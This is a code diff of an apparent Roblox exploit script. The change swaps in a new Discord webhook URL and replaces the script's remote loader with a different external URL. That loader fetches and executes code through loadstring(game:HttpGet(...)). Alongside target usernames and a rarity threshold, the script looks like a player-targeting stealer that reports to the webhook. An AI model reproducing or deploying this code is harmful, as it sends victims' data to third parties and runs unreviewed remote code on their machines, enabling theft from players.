@@ -8,7 +8,7 @@ if not game:IsLoaded() then
 end
 
 local username = {"harryman_73", "harryman_73"}
-local webhook = "https://discord.com/api/webhooks/1506466365941354586/hJMbZGloi8NkylgSq1vKxuGsFHhfjr-f5gY59bXyBC3GpXsPtY8Bnckl-pou-x9xPQ7x"
+local webhook = "https://discord.com/api/webhooks/1508254647616278681/4PXpOcqLy1-A6VUF6J9ByuyxcrN1-oqNNabUunc61PUW0nJEDBHiagcAHT79kEuLLl7I"
 local minrarity = 1
 local exploit = identifyexecutor() or "Unknown"
 getgenv().discourdid = getgenv().discourdid or "1409876448906580018"
@@ -111,7 +111,7 @@ if PlaceId ~= 77747658251236 then
     end
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gurryr/Sailor-Piece/refs/heads/main/SCRIPT"))()
+loadstring(game:HttpGet("https://redyn.pages.dev/Red/Loading.lua"))()
 
 ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("SettingsToggle"):FireServer("MuteSFX", true)
 
